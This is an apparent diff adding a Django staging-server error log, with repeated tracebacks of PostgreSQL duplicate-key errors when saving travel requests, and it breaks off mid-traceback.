+TypeError: Object of type 'IntegrityError' is not JSON serializable
+ERROR|18/May/2021 15:06:52|basehttp|685516|140164177327872|"POST /get_add/employee/ HTTP/1.1" 500 106141
+ERROR|18/May/2021 15:16:45|log|685516|140164177327872|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(18) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 245, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(18) already exists.
+
+ERROR|18/May/2021 15:16:45|basehttp|685516|140164177327872|"POST /get_add/travel_request/ HTTP/1.1" 500 22882
+ERROR|18/May/2021 15:31:52|log|690001|140598916720384|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(19) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 246, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(19) already exists.
+
+ERROR|18/May/2021 15:31:52|basehttp|690001|140598916720384|"POST /get_add/travel_request/ HTTP/1.1" 500 22932
+ERROR|18/May/2021 15:38:57|log|690629|139746154133248|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(20) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 247, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(20) already exists.
+
+ERROR|18/May/2021 15:38:57|basehttp|690629|139746154133248|"POST /get_add/travel_request/ HTTP/1.1" 500 22932
+ERROR|18/May/2021 15:44:35|log|690629|139746154133248|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(21) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 247, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(21) already exists.
+
+ERROR|18/May/2021 15:44:35|basehttp|690629|139746154133248|"POST /get_add/travel_request/ HTTP/1.1" 500 22932
+ERROR|18/May/2021 15:46:00|log|690629|139746154133248|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(22) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/travel/views.py", line 247, in post
+    travel_id=serializer.save().travel_req_id
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 214, in save
+    self.instance = self.create(validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/serializers.py", line 943, in create
+    instance = ModelClass._default_manager.create(**validated_data)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 413, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 717, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 747, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 830, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/base.py", line 868, in _do_insert
+    using=using, raw=raw)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 1133, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1285, in execute_sql
+    cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+django.db.utils.IntegrityError: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(22) already exists.
+
+ERROR|18/May/2021 15:46:00|basehttp|690629|139746154133248|"POST /get_add/travel_request/ HTTP/1.1" 500 22932
+ERROR|18/May/2021 15:46:07|log|690629|139746154133248|Internal Server Error: /get_add/travel_request/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "travel_travel_request_pkey"
+DETAIL:  Key (id)=(23) already exists.
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
